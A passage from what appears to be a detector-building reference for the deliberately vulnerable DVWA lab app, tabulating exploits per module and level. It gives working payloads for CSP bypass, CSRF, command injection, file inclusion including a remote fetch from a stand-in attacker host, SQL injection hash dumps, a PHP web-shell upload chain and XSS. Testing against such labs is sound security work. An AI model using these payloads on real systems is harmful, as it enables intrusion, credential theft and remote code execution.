| low | `script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com unpkg.com cdn.jsdelivr.net digi.ninja ;` (`low.php` L3) | `$page['body'] .= "<script src='" . $_POST['include'] . "'></script>";` (L13-17) | POST `include=source/jsonp.php?callback=alert(1)//` (same-origin JSONP, allowed by `'self'`) → emitted `<script src='source/jsonp.php?callback=alert(1)//'></script>`, JS is `alert(1)//({"answer":"15"})`. Intended alternative: allowed external host, e.g. `https://cdn.jsdelivr.net/gh/digininja/csp_bypass/alert.js`, `https://unpkg.com/@digininja/csp_bypass@1.0.0/index.js`, `https://digi.ninja/dvwa/alert.js` (comment L7-9; `digi.ninja/dvwa/alert.txt` fails due to MIME) | Response header contains the level's CSP string **and** body contains the injected `<script src='…'>` (server-side reflection). JS execution needs a browser |
| medium | `script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';` (`medium.php` L3) | raw append: `$page['body'] .= "\n\t" . $_POST['include'] . "\n";` (L14-18) | POST `include=<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>` — nonce is static (documented in comment L10) | Response contains the exact `<script nonce="…">alert(1)</script>` raw; CSP header has the nonce |
| high | `script-src 'self';` (`high.php` L2) | raw append (L8-12) | POST `include=<script src="source/jsonp.php?callback=alert(1)//"></script>` — same-origin, so allowed; jsonp.php reflects the callback (`jsonp.php` L4-12) | Response contains `<script src="source/jsonp.php?callback=alert(1)//"></script>`; independently `GET /vulnerabilities/csp/source/jsonp.php?callback=alert(1)//` returns `alert(1)//({"answer":"15"})` |
| impossible | `script-src 'self';` (`impossible.php` L3) | raw append (**still present**, L9-13) | Intended answer: page uses `source/impossible.js` → `jsonp_impossible.php` with hardcoded `solveSum` callback (`jsonp_impossible.php` L1-7), so callback injection is impossible. **Caveat:** the raw `include` reflection and the old `jsonp.php` remain reachable, and CSP `'self'` allows loading it — source alone cannot prove the page safe. Browser test with `include=<script src="source/jsonp.php?callback=alert(1)//"></script>` is required; if no alert then report not exploitable, otherwise report residual bypass | `GET /vulnerabilities/csp/source/jsonp_impossible.php` → `solveSum ({"answer":"15"})` (no callback parameter accepted) |

- Important detector rule: the `include` parameter is reflected **unescaped at every level**, including impossible — mere HTML reflection is *not* evidence of XSS. Execution depends on CSP: compare the level's CSP header and (for medium) the static nonce, or use the JSONP callback reflection as the server-side sink signal.
- The JSONP helper is the deterministic server-side injectable sink: `callback` is concatenated unvalidated before `(<json>)`; any GET works unauthenticated.

---

### 3.8 CSRF — `/vulnerabilities/csrf/`

Form is `method="GET"` (`index.php` L54) with fields `password_new`, `password_conf`, `Change` (+ `password_current` impossible; hidden `user_token` high/impossible, L56-71). All handlers update the **current session user's** password (normally admin) — restore with `setup.php` reset.

| Level | Request | Server logic | Exploit | Marker |
|---|---|---|---|---|
| low | `GET /vulnerabilities/csrf/?password_new=X&password_conf=X&Change=Change` | no checks: matching `password_new==password_conf` then `UPDATE users SET password=MD5(...) WHERE user=<current>` (`source/low.php` L3-21) | as shown | `<pre>Password Changed.</pre>` |
| medium | same GET, **plus `Referer` header containing `$_SERVER['SERVER_NAME']`** | `stripos($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME']) !== false` (`source/medium.php` L5); otherwise `<pre>That request didn't look correct.</pre>` | `GET …?password_new=X&password_conf=X&Change=Change` with `Referer: {BASE}/vulnerabilities/csrf/` (host must contain SERVER_NAME, e.g. `127.0.0.1`) | `<pre>Password Changed.</pre>`; without referer → `That request didn't look correct.` |
| high — HTML | `GET` or `POST /vulnerabilities/csrf/` with `user_token`, `password_new`, `password_conf`, `Change` | token checked via `checkToken($token, $_SESSION['session_token'], 'index.php')` (L20-33); token from a fresh GET of the page | GET page → token → `GET /vulnerabilities/csrf/?password_new=X&password_conf=X&Change=Change&user_token=<token>` (or same as POST form body) | `<pre>Password Changed.</pre>` |
| high — JSON (bonus challenge, help/help.php) | `POST /vulnerabilities/csrf/`, headers `Content-Type: application/json` **exactly** and `user-token: <token>`; body `{"password_new":"X","password_conf":"X","Change":1}` | JSON branch requires `$_SERVER['CONTENT_TYPE']=="application/json"`, `HTTP_USER_TOKEN`, and keys `password_new`,`password_conf`,`Change` (`source/high.php` L7-29); returns JSON (L56-60) | exact sample from help: `POST /vulnerabilities/csrf/` + `user-token: <token>` + body `{"password_new":"a","password_conf":"a","Change":1}` | JSON response `Content-Type: application/json`, body `{"Message":"Password Changed."}` |
| impossible | GET with `password_current`, `password_new`, `password_conf`, `Change`, `user_token` | token (L5) + current-password must match DB via PDO (L8-25) | none (attacker doesn't know current password) | `<pre>Passwords did not match or current password incorrect.</pre>`; bad/missing token → 302 `index.php` |

- `test_credentials.php` helper (`GET/POST /vulnerabilities/csrf/test_credentials.php`, login-only): POST `username`, `password`, `Login` → `<h3 class="loginSuccess">Valid password for 'admin'</h3>` or `<h3 class="loginFail">Wrong password for 'admin'</h3>` — use it to confirm/restore changed passwords without re-login.
- Token for high: fetch `GET /vulnerabilities/csrf/` and parse `user_token`; it is destroyed by the next page render.

---

### 3.9 Command Injection — `/vulnerabilities/exec/`

Form: `POST /vulnerabilities/exec/` fields `ip`, `Submit=Submit`; impossible adds `user_token` (`index.php` L41-49). Docker image installs `iputils-ping` (`Dockerfile` L12), so `ping` exists.

| Level | Filter (source) | Exploit `ip` payload | Marker |
|---|---|---|---|
| low | none; `shell_exec('ping -c 4 ' . $target)` (`source/low.php` L5, L14) | `127.0.0.1; id` (or `127.0.0.1 && id`, `$(id)`, backticks) | Response `<pre>` contains `uid=` (e.g. `uid=33(www-data) gid=33(www-data)`) |
| medium | `str_replace(['&&'=>'', ';'=>''], …)` (`source/medium.php` L8-14) | `127.0.0.1|id` (single pipe untouched; also newline `%0A`, or backticks) | `uid=` in `<pre>` |
| high | removes `||`, `&`, `;`, `| ` (pipe+space), `-`, `$`, `(`, `)`, backtick (`source/high.php` L8-21) | `127.0.0.1|id` — bare `|` with no following space is not removed; avoid `-` in your command (use `id`, `whoami`, `cat /etc/passwd`) | `uid=` in `<pre>` |
| impossible | token (L5) + `stripslashes` + `explode('.')` with exactly 4 numeric octets then re-join (`source/impossible.php` L8-18) | none | `ip=127.0.0.1;id` → `<pre>ERROR: You have entered an invalid IP.</pre>`; missing token → 302 `index.php`; report "not exploitable" |

- GET also works at low/medium/high because the source reads `$_REQUEST['ip']`, but the form is POST — use POST for fidelity.
- The module gives full command output in the page (`$html .= "<pre>{$cmd}</pre>"`), so a command that writes a file or echoes a marker is directly observable.

---

### 3.10 File Inclusion — `/vulnerabilities/fi/`

Request: `GET /vulnerabilities/fi/?page=<value>`. `source/<level>.php` sets `$file`; `index.php` L34-40 does `if(isset($file)) include($file); else 302 ?page=include.php`. Landing links: `?page=include.php`, `?page=file1.php` … `file3.php`.
**Canonical success-marker file:** `hackable/flags/fi.php` — when included it prints `1.) Bond. James Bond`, `2.) My name is Sherlock Holmes…`, etc.; direct HTTP access is blocked by its `DVWA_WEB_PAGE_TO_ROOT` guard. So `page=../../hackable/flags/fi.php` (low/medium) or `page=file:///var/www/html/hackable/flags/fi.php` (high) gives a definitive marker without touching `/etc/passwd`.

| Level | Filter (source) | Exploit | Marker |
|---|---|---|---|
| low | none: `$file = $_GET['page']` (`source/low.php` L4) | LFI: `?page=../../hackable/flags/fi.php`; `?page=/etc/passwd`; `?page=../../hackable/uploads/shell.php` (include executes PHP); RFI: `?page=http://attacker/evil.txt` **only if `allow_url_include` on** | `1.) Bond. James Bond` (flags) / `root:x:0:0` (/etc/passwd) / command output from included PHP |
| medium | `str_replace(["http://","https://"],"")` then `str_replace(["../","..\\"],"")` (`source/medium.php` L7-8) | Traversal bypass: `?page=....//....//....//....//....//etc/passwd` (each `....//` collapses to `../`; 5 levels from `/var/www/html/vulnerabilities/fi` → `/`). Or `?page=file:///etc/passwd` (contains no filtered token). Flags: `?page=....//....//hackable/flags/fi.php`. RFI bypass (if PHP<8): `?page=hhttp://ttp://attacker/evil.txt` filters to `http://attacker/evil.txt` | `root:x:0:0` / `1.) Bond. James Bond` / included-PHP output |
| high | `if (!fnmatch("file*", $file) && $file != "include.php") { echo "ERROR: File not found!"; exit; }` (`source/high.php` L7-11) — `fnmatch` wildcard matches `/` | `?page=file:///etc/passwd` (starts with `file`), `?page=file4.php` (hidden page: "File 4 (Hidden)"/"Good job!"), or uploaded-image chain `?page=file:///var/www/html/hackable/uploads/shell.jpg` (see §3.15) | `root:x:0:0`; or `<h3>File 4 (Hidden)</h3>`; or included-PHP command output |
| impossible | whitelist exactly `include.php`, `file1.php`, `file2.php`, `file3.php` (`source/impossible.php` L7-18) | none | `ERROR: File not found!` (plain echo + exit); `file4.php` is not allowed at this level → report "not exploitable" |

- RFI availability caveat: the repo's `php.ini` sets `allow_url_include=on`, but the official Dockerfile is `php:8-apache` (`Dockerfile` L1) and the copied `php.ini` is not loaded as PHP configuration → PHP 8 has removed `allow_url_include`; `include.php` L5-10 prints `The PHP function allow_url_include is not enabled.` when it is off. Treat RFI as environment-dependent; LFI works everywhere.
- Include executes PHP code regardless of the included file's extension, which is what makes the upload→FI chain work.

---

### 3.11 JavaScript Attacks — `/vulnerabilities/javascript/`

Form: `POST /vulnerabilities/javascript/` fields `token` (hidden, filled by JS), `phrase` (text), `send=Submit` (`index.php` L97-101). Server (`index.php` L32-73): POST requires `phrase` **and** `token`; if `phrase == "success"` the expected token is level-specific:

| Level | Expected token (server-side, exact) | Derivation |
|---|---|---|
| low | `38581812b435834ebf84ebcc2c6424d6` | `md5(str_rot13("success"))` = md5("fhpprff") (`index.php` L43; JS `source/low.php` L12-19) |
| medium | `XXsseccusXX` | `strrev("XXsuccessXX")` (`index.php` L50; JS `source/medium.js` reverses `"XX"+phrase+"XX"`) |
| high | `ec7ef8687050b6fe803867ea696734c67b541dfafb286a0b1239f42ac5b0aa84` | `sha256( sha256("XX" . strrev("success")) . "ZZ" )` = sha256( sha256("XXsseccus")+"ZZ" ) (`index.php` L57; JS flow in `source/high_unobfuscated.js` L520-540: `token_part_1` reverses phrase, `token_part_2("XX")` after 300 ms prepends+sha256, `token_part_3` on click appends "ZZ"+sha256) |
| impossible | no challenge | page deliberately has no form; `index.php` L75-84 renders an explanation ("You can never trust anything that comes from the user … there is no impossible level") and `source/impossible.php` is empty |

- **Exploit (all exploitable levels):** `POST /vulnerabilities/javascript/` body `phrase=success&token=<expected-token>&send=Submit` → `<p style='color:red'>Well done!</p>`.
- Failure markers: `<p>Invalid token.</p>` (phrase right, token wrong), `<p>You got the phrase wrong.</p>` (phrase ≠ success), `<p>Missing phrase or token.</p>`.
- No CSRF token, no session data involved.
- impossible detector: POST returns the explanation page (no "Well done!"); report "N/A — module intentionally has no impossible level" (this is per source, not a vulnerability).

---

### 3.12 Open HTTP Redirect — `/vulnerabilities/open_redirect/`

The vulnerable endpoints are the **raw source files** (no auth, no token): `{BASE}/vulnerabilities/open_redirect/source/<low|medium|high|impossible>.php?redirect=<value>`. The module page links them (`index.php` L15-32).

| Level | Logic (source) | Exploit | Marker |
|---|---|---|---|
| low | `header("location: " . $_GET['redirect']);` no validation (`source/low.php` L3-6) | `GET …/source/low.php?redirect=https://digi.ninja` (help spoiler) | HTTP 302 with `Location: https://digi.ninja` (arbitrary external URL) |
| medium | rejects `preg_match("/http:\/\/|https:\/\//i", …)` (`source/medium.php` L4-9) | Protocol-relative: `GET …/source/medium.php?redirect=//digi.ninja` (help spoiler) | 302 `Location: //digi.ninja` (contains no `http://`/`https://`) |
| high | requires `strpos($_GET['redirect'], "info.php") !== false` (`source/high.php` L4-8) | `GET …/source/high.php?redirect=https://digi.ninja/?a=info.php` (help spoiler; contains `info.php`), or `//attacker/info.php` | 302 `Location: https://digi.ninja/?a=info.php` |
| impossible | only numeric map: `1→info.php?id=1`, `2→info.php?id=2`, `99→https://digi.ninja` hardcoded (`source/impossible.php` L5-26) | none (target not user-controlled) | `?redirect=99` → 302 `Location: https://digi.ninja` is by design; non-numeric → HTTP 200 `Missing redirect target.`; numeric ≠1/2/99 → 200 `Unknown redirect target.` → report "not exploitable" |

- Negative markers shared by low/medium/high: missing/empty `redirect` → **500** `<p>Missing redirect target.</p>`; blocked value → **500** `<p>Absolute URLs not allowed.</p>` / `<p>You can only redirect to the info page.</p>`.
- `Location:` header is the only reliable signal — do not follow redirects in the HTTP client (or check `allow_redirects=False`).

---

### 3.13 SQL Injection — `/vulnerabilities/sqli/`

| Level | URL / method / params | Server query & filter | Exploit | Marker |
|---|---|---|---|---|
| low | `GET /vulnerabilities/sqli/?id=<payload>&Submit=Submit` (form GET; source uses `$_REQUEST`) | `"SELECT first_name, last_name FROM users WHERE user_id = '$id';"` — no escaping (`source/low.php` L10); DB errors `or die('<pre>'.mysqli_error…)</pre>`) | `id=1' UNION SELECT user,password FROM users#` → dumps usernames + MD5s. Boolean: `id=1' OR '1'='1`. Error-based also possible | `<pre>ID: 1' UNION …<br />First name: admin<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>` — regex `First name: admin` + 32-hex hash `5f4dcc3b5aa765d61d8327deb882cf99` |
| medium | `POST /vulnerabilities/sqli/` body `id=<payload>&Submit=Submit` (source is `$_POST`; form POST) | `mysqli_real_escape_string($id)` then **numeric context unquoted**: `WHERE user_id = $id` (`source/medium.php` L7, L11) | `id=1 UNION SELECT user,password FROM users#` (no quote needed); `id=1 OR 1=1` | same `First name: admin` + hash marker |
| high | two-step: (1) `POST /vulnerabilities/sqli/session-input.php` body `id=<payload>` (no token; sets `$_SESSION['id']`, L11-15) → (2) `GET /vulnerabilities/sqli/` (high.php executes on `$_SESSION['id']`, L3-10; index shows no form at high) | query: `… WHERE user_id = '$id' LIMIT 1;` (`source/high.php` L10) — must comment out the trailing `LIMIT 1` | payload `1' UNION SELECT user,password FROM users#` via `session-input.php`, then GET the module page | same `First name: admin` + hash marker in the later GET |
| impossible | `GET /vulnerabilities/sqli/?id=1&Submit=Submit&user_token=<token>` | token check L5 (redirect to `index.php` on failure), `is_numeric()`, `intval()`, PDO prepared `bindParam(':id', PDO::PARAM_INT)` (`source/impossible.php` L4-29) | none | valid `id=1` → `<pre>ID: 1<br />First name: admin<br />Surname: admin</pre>`; `id=1'…` → no output (is_numeric false) — report "not exploitable"; missing token → 302 |

- Note: `submit` field is only checked with `isset($_REQUEST['Submit'])` — include it on GET/POST.
- Token for impossible must come from a fresh `GET /vulnerabilities/sqli/`.

---

### 3.14 SQL Injection (Blind) — `/vulnerabilities/sqli_blind/`

| Level | URL / method / params | Query & filter | Bool payloads | Marker |
|---|---|---|---|---|
| low | `GET /vulnerabilities/sqli_blind/?id=<payload>&Submit=Submit` (`$_GET`, source low L3-5) | `WHERE user_id = '$id'` no filter (L11) | true `1' AND '1'='1`; false `1' AND '1'='2` | true: **200** + `<pre>User ID exists in the database.</pre>`; false: **HTTP 404** + `<pre>User ID is MISSING from the database.</pre>` |
| medium | `POST /vulnerabilities/sqli_blind/` body `id=<payload>&Submit=Submit` (`$_POST`, L3-5) | `mysqli_real_escape_string` but numeric context unquoted `WHERE user_id = $id` (L10-13) | true `1 AND 1=1`; false `1 AND 1=2` | true: `<pre>User ID exists in the database.</pre>`; false: `<pre>User ID is MISSING from the database.</pre>` — **both HTTP 200** (only text differs) |
| high | cookie `id`: either `POST /vulnerabilities/sqli_blind/cookie-input.php` body `id=<payload>` (no token, sets cookie, L11-14) then `GET /vulnerabilities/sqli_blind/`; or simply send `Cookie: id=<payload>` (`$_COOKIE['id']`, L3-6) | `WHERE user_id = '$id' LIMIT 1;` (L11); false branch occasionally sleeps 2-4 s (L51-53); no 404 | true `1' AND '1'='1`; false `1' AND '1'='2` | text only, both 200: `User ID exists in the database.` vs `User ID is MISSING from the database.` |
| impossible | `GET /vulnerabilities/sqli_blind/?id=1&Submit=Submit&user_token=<token>` | token L5; `is_numeric`/`intval`/PDO prepared (L4-21) | none | not exploitable; `id=1` → exists text (200); injected payload fails `is_numeric` → `$exists=false` → **404** + MISSING text (L49-59) |

- Extraction example (works low/high; medium unquoted variant): `1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='5'#` — true when the hash starts with `5` (admin MD5 `5f4dcc3b5aa765d61d8327deb882cf99`). Vary char/position and compare "exists" vs "MISSING".
- Robust detector: send the true/false pair and assert the *difference* (text and/or 200/404), then infer `LENGTH(...)` and first character.

---

### 3.15 File Upload — `/vulnerabilities/upload/`

Form: `POST /vulnerabilities/upload/` `multipart/form-data`, fields `uploaded` (file), `Upload=Upload`, optional `MAX_FILE_SIZE=100000`; impossible adds `user_token` (`index.php` L51-59). Destination: `DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/" . basename($_FILES['uploaded']['name'])` (`source/low.php` L5-6) → served at `{BASE}/hackable/uploads/<name>`.

| Level | Validation (source) | Exploit | Marker |
|---|---|---|---|
| low | `isset($_POST['Upload'])` only; unconditional `move_uploaded_file` (`source/low.php` L3-16) | Upload `shell.php` with body `<?php system($_GET['cmd']); ?>` → then `GET /hackable/uploads/shell.php?cmd=id` | upload response `<pre>../../hackable/uploads/shell.php succesfully uploaded!</pre>` (note the source's typo `succesfully`); RCE marker `uid=` in the second response |
| medium | `$_FILES['uploaded']['type']` ∈ {`image/jpeg`,`image/png`} **and** size < 100000 (`source/medium.php` L14-15) — client-controlled MIME | Same `shell.php` but set the multipart part `Content-Type: image/jpeg` (Python `files={'uploaded': ('shell.php', payload, 'image/jpeg')}`) | `succesfully uploaded!` + direct `GET /hackable/uploads/shell.php?cmd=id` → `uid=` |
| high | extension (after last dot) ∈ {jpg,jpeg,png} **and** size < 100000 **and** `getimagesize($uploaded_tmp)` truthy (`source/high.php` L14-17); no re-encode | Build a valid JPEG with appended `<?php system($_GET['cmd']); ?>`, upload as `shell.jpg` (filename ext must be image). Saved unchanged → PHP inside is not executed by direct GET. **Execute via FI module (same security level):** `GET /vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/shell.jpg&cmd=id` (FI high's `fnmatch("file*")` accepts a `file://` URL) | upload: `succesfully uploaded!` + stored file 200; chained FI response contains `uid=`. Standalone: report "upload accepted (image policy bypass) but code execution requires the File Inclusion module" |
| impossible | token (L5) + ext + size + MIME + `getimagesize` + **32-hex random filename** + GD re-encode to strip non-image data (`source/impossible.php` L3-59) | none | PHP file with image extension/real image header → re-encoded, random name in `<a href='…'>`; pure PHP file → `<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>`; report "not exploitable" |

- `hackable/uploads/` is writable at runtime in the Docker image: `COPY --chown=www-data:www-data . .` (`Dockerfile` L20) makes the Apache user own it; `upload/index.php` L36 prints a warning when the folder is not writable. Uploaded `.php` files execute on the default `php:8-apache` image.
- Detection for low/medium **must** follow up with a request to the uploaded file; the upload message alone proves only file write.

---

### 3.16 Weak Session IDs — `/vulnerabilities/weak_id/`

Request: `POST /vulnerabilities/weak_id/` (form has no fields; any POST triggers; no token). Each response sets the cookie `dvwaSession` via `setcookie(...)` (`setcookie` default path is the module dir at low/medium; high/impossible pass explicit `path=/vulnerabilities/weak_id/` and `domain=$_SERVER['HTTP_HOST']`). GETs do nothing.

| Level | Generation (source) | Expected `Set-Cookie: dvwaSession=` | Detection |
|---|---|---|---|
| low | `$_SESSION['last_session_id']++` starting at 0 (`source/low.php` L6-11) | `1`, then `2`, `3`, … (pure counter) | POST twice: values are small sequential decimals → report predictable |
| medium | `time()` (`source/medium.php` L6-7) | 10-digit Unix timestamp ≈ current time | value within a few seconds of `int(time())` → report predictable |
| high | `md5($_SESSION['last_session_id_high']++)` (`source/high.php` L6-11); flags: expires `time()+3600`, path `/vulnerabilities/weak_id/`, `httpOnly=false`, `secure=false` | first POST `c4ca4238a0b923820dcc509a6f75849b` (=md5("1")), second `c81e728d9d4c2f636f067f89cc14862c` (=md5("2")) | 32-hex; equals md5 of the incrementing integer → predictable |
| impossible | `bin2hex(random_bytes(20))` (`source/impossible.php` L6-7); flags: expires `time()+3600`, path, `secure=true`, `httpOnly=true` | 40 lowercase hex chars, random | not predictable → report "not exploitable" (also note the Secure flag means a browser will not resend it over plain HTTP) |

- Success marker for detection = presence of a `Set-Cookie: dvwaSession=...` header on POST whose value matches the expected pattern for the level (numeric counter / timestamp / md5(int) / random 40-hex).
- The module does not authenticate with `dvwaSession`; the exercise is predictability (help/help.php confirms per-level semantics).

---

### 3.17 DOM-based XSS — `/vulnerabilities/xss_d/`

Request: `GET /vulnerabilities/xss_d/?default=<payload>` (form GET). **The server never outputs `default`** — the sink is client-side JavaScript in `index.php` L50-61:
```js
var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
```
(`$decodeURI` is `""` at impossible, L35-38). Therefore HTTP-only detection can only verify filter behaviour; **actual XSS confirmation needs a browser engine** (Playwright/Selenium: register `dialog` handler and look for an `alert`).

| Level | Server-side handling (source) | Payload (help/help.php) | HTTP signal | Browser success |
|---|---|---|---|---|
| low | none (`source/low.php` L3 comment "No protections, anything goes") | `/vulnerabilities/xss_d/?default=English<script>alert(1)</script>` (URL-encode) | 200 for every `default` value (payload never reflected) | `alert(1)` fires (payload decoded by `decodeURI`) |
| medium | `if (stripos($default,"<script") !== false) { header("location: ?default=English"); exit; }` (`source/medium.php` L4-11) | `/vulnerabilities/xss_d/?default=English>/option></select><img src='x' onerror='alert(1)'>` (help spoiler; breaks out of the `<select>`) | payload **without** `<script` → **200**; payload containing `<script` → **302 to `?default=English`** (filter-bypass marker) | onerror alert fires |
| high | whitelist `switch($default)` French/English/German/Spanish else 302 (`source/high.php` L7-17) | Fragment technique: `/vulnerabilities/xss_d/?default=English#<script>alert(1)</script>` — the fragment is not sent to the server, so the request seen by PHP is `?default=English` | request with `?default=English` → 200; any other `default` value → 302 `?default=English`; the fragment can never be observed server-side | browser reads full `href` incl. fragment → alert |
| impossible | no server check; client-side `decodeURI` removed (`index.php` L35-38; help: browsers percent-encode the injected content) | none | 200 always (no server signal) | expected no alert → report "not exploitable"; note client-side only |

- Detector guidance: for low/medium/high report "DOM-XSS sink present; server-side filter bypassed" (200 vs 302 evidence), and only mark "confirmed XSS" if a JS-capable check observes the alert. Do not expect the payload in the HTTP response at any level.

---

### 3.18 Reflected XSS — `/vulnerabilities/xss_r/`

Request: `GET /vulnerabilities/xss_r/?name=<payload>` (form GET). All levels echo `<pre>Hello {$name}</pre>` (`source/*.php`); low/medium/high send `X-XSS-Protection: 0` (L3) — impossible does not.

| Level | Filter (source) | Working payload | Marker (raw payload in response) |
|---|---|---|---|
| low | none: `$html .= '<pre>Hello ' . $_GET['name'] . '</pre>';` (L6-8) | `?name=<script>alert(1)</script>` | `<pre>Hello <script>alert(1)</script></pre>` — raw `<script>` present, unencoded |
| medium | `$name = str_replace('<script>', '', $_GET['name']);` (case-sensitive, single pass, L8) | `?name=<SCRIPT>alert(1)</SCRIPT>` or `<img src=x onerror=alert(1)>` or `<scr<script>ipt>alert(1)</script>` | raw `<SCRIPT>alert(1)</SCRIPT>` (or `<img …onerror…>`) in `<pre>` |
| high | `preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['name'])` (L8) | `?name=<img src=x onerror=alert(1)>` (no s→c→r→i→p→t sequence) | raw `<img src=x onerror=alert(1)>` in `<pre>` |
| impossible | token (L6) + `htmlspecialchars($_GET['name'])` (L9) | none | payload HTML-encoded (`&lt;script&gt;` inside `Hello …`); with no/invalid token → **302** to `/vulnerabilities/xss_r/index.php`; report "not exploitable" |

- Success = the exact payload substring appears in the body (HTTP 200). For low also check the response header `X-XSS-Protection: 0`.

---

### 3.19 Stored XSS — `/vulnerabilities/xss_s/`

Form: `POST /vulnerabilities/xss_s/` fields `txtName`, `mtxMessage`, `btnSign=Sign+Guestbook`; impossible adds `user_token`. Rendering: `dvwaGuestbook()` in `dvwaPage.inc.php` L610-629 reads `guestbook` table and outputs name/comment raw, except at impossible it `htmlspecialchars()` both (L617-619).

| Level | Sanitisation (source) | Working payload | Marker |
|---|---|---|---|
| low | message & name: `trim`, `stripslashes`, `mysqli_real_escape_string` only — no HTML escaping (`source/low.php` L3-17) | `txtName=<img src=x onerror=alert(1)>&mtxMessage=hi` (or `<script>alert(1)</script>` anywhere) | raw payload in the POST response and in any later `GET /vulnerabilities/xss_s/` (inside `<div id="guestbook_comments">`) |
| medium | message: `strip_tags(addslashes())` + `htmlspecialchars` (safe, L9-11); name: only `str_replace('<script>','', $name)` (L14) | inject via **name**: `txtName=<img src=x onerror=alert(1)>` (or `<SCRIPT>alert(1)</SCRIPT>`) | raw payload rendered in guestbook (name slot) |
| high | message: `strip_tags`+`htmlspecialchars` (safe); name: `preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i','',$name)` (L14) | inject via **name**: `txtName=<img src=x onerror=alert(1)>` | raw `<img src=x onerror=alert(1)>` in guestbook |
| impossible | token (L5) + `htmlspecialchars` on both fields (L14, L19) + PDO prepared insert (L22-25) | none | response shows `&lt;img …` encoded; no raw payload; missing token → 302 → report "not exploitable" |

- The client-side `maxlength` on `txtName` (10) is not enforced server-side; keep payloads short anyway.
- Cleanup: `POST /vulnerabilities/xss_s/` body `btnClear=Clear+Guestbook` → `TRUNCATE guestbook` (`index.php` L16-19; no token required at any level). Do this after stored-XSS tests.

---

## 4. Special cases and cross-module behaviour (explicit checklist)

1. **Insecure CAPTCHA / reCAPTCHA keys:** default keys are empty (`config.inc.php.dist` L27-28) and no keys are set by `compose.yml`/`Dockerfile`; with empty keys the form is hidden and success output is overwritten by "Please register for a key" (`captcha/index.php` L38-42). The numeric step tokens are: low = `step=2` only; medium = `step=2&passed_captcha=true`; high = `g-recaptcha-response=hidd3n_valu3` + `User-Agent: reCAPTCHA`; impossible = real CAPTCHA + `password_current` + `user_token`. If keys are configured on the instance, low/medium/high behave as above; the success text then appears. Verify the side effect through `csrf/test_credentials.php` if the text is suppressed, then `setup.php` reset.
2. **CSP Bypass:** which JS is allowed — low = `'self'` + listed external hosts (use `source/jsonp.php?callback=…` or the jsDelivr/unpkg alert.js URLs); medium = inline allowed only with the **static** nonce `TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=`; high = `'self'` only → JSONP `source/jsonp.php?callback=alert(1)//`; impossible = `'self'` + hardcoded `source/jsonp_impossible.php`. The old `source/jsonp.php` is reachable at every level (`callback` reflected unencoded). `include` is reflected raw at every level (including impossible) — reflection alone is not XSS evidence.
3. **JavaScript Attacks:** phrase is always `success`; tokens are `38581812b435834ebf84ebcc2c6424d6` (low), `XXsseccusXX` (medium), `ec7ef8687050b6fe803867ea696734c67b541dfafb286a0b1239f42ac5b0aa84` (high); impossible has no challenge.
4. **Authorisation Bypass:** non-admin menu hidden only (`dvwaPage.inc.php` L311-313); page 200 at low, 403 at medium/high/impossible; `get_user_data.php` returns data at low/medium (no session needed), fails at high/impossible; `change_user_details.php` works at low/medium/high with JSON POST `{"id":…,"first_name":…,"surname":…}` (no session needed) and fails only at impossible. Use `gordonb / abc123`.
5. **API:** endpoints are outside DVWA auth/`security` gating — no login needed for `/vulnerabilities/api/v2/...`; the four weaknesses (v1 password leak, PUT `level` mass assignment, health `connectivity` command injection, OAuth flow) can be tested at any DVWA level. Requires `mod_rewrite` (setup.php L49-68 reports it; `.htaccess` L1-10); vendor autoload is installed into the image by the Dockerfile (`composer install`).
6. **Broken Access Control:** un-menu'd module; direct GET `?action=View+Profile&user_id=N`; low = cookie `user_id`, medium = query `token=user_token`, high = server-side `$_SESSION['user_id']` (not bypassable by trusting a cookie — help text is stale), impossible = self-only + rate limit.
7. **Weak Session IDs:** cookie name `dvwaSession`; low counter, medium `time()`, high `md5(int counter)`, impossible 40-hex `random_bytes(20)` with Secure+HttpOnly.
8. **Cryptography:** low = POST `password=Olifant` to `index.php`; medium = POST `token=<160-hex spliced token>` to `index.php`; high = `POST source/check_token_high.php` JSON `{"token","iv"}` with IV byte 7 XOR 0x03; impossible = same endpoint with AES-256-GCM (status 526 on tamper).
9. **Open HTTP Redirect:** raw `source/<level>.php?redirect=` endpoints, unauthenticated; low arbitrary URL, medium `//host`, high value containing `info.php`, impossible numeric map only.
10. **Upload + File Inclusion chain (high):** upload a real JPEG carrying `<?php … ?>` as `shell.jpg`, then include with `?page=file:///var/www/html/hackable/uploads/shell.jpg` — upload's high filter passes (image + allowed ext) and FI's high filter passes (string starts with `file`); PHP code inside the JPG executes on include.
11. **DOM XSS (xss_d)** and **CSP** need a browser to *confirm* JavaScript execution; all other modules are confirmable over plain HTTP using the markers above.
12. **`vulnerabilities/bac/log_viewer.php` is empty (0 bytes)**; `security.php` L83 links to it. It is not a broken target, just a blank file.
13. **The API's `loginJSON()` method is dead code** (`LoginController` L48-72 not dispatched); use the OAuth form flow.
14. **Session fixation** is intentionally possible at low/medium/high (`dvwa_start_session` keeps the supplied `PHPSESSID`), which is the framing for the BAC-high "session" hint — but for an automated scanner it means: re-use one cookie jar per user; no HTTP-only cookie mutation can set another user's session values.

---

## 5. Compact exploit matrix (module × level)

`URL` relative to `{BASE}`. Body fields are form-urlencoded unless marked JSON/multipart. Markers are response-body substrings unless noted. "n/a" = module intentionally has no exploitable state at that level.

| module | level | URL | method | params | payload | success marker |
|---|---|---|---|---|---|---|
| api | low | /vulnerabilities/api/v1/user/ | GET | – | version segment `v1` | `"password":"` in JSON |
| api | medium | /vulnerabilities/api/v2/user/2 | PUT | JSON `name`,`level` | `{"name":"morph","level":0}` | `"level":0` in 200 JSON |
